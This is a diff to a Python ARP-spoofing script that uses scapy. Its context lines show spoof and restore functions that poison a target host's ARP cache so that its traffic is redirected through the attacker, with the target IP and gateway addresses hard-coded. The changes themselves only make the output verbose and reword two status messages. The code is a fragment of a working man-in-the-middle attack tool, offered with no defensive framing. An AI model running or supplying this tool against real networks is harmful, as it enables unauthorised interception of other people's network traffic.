@@ -20,14 +20,14 @@ def get_mac(ip):
 
 def spoof(t_ip, spoof_ip):
     packet = ARP(op="is-at", pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, verbose=True)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = ARP(op="is-at", pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, verbose=True)
 
 
 target_ip = "10.10.10.20"
@@ -44,7 +44,7 @@ if __name__ == '__main__':
             time.sleep(2)
 
     except KeyboardInterrupt:
-        print("\nSpoofing stopped, addresses restored")
+        print("\nSpoofing stopped")
         restore(gateway_ip, target_ip)
         restore(target_ip, gateway_ip)
-        print("\nAddresses restored")
+        print("Addresses restored")
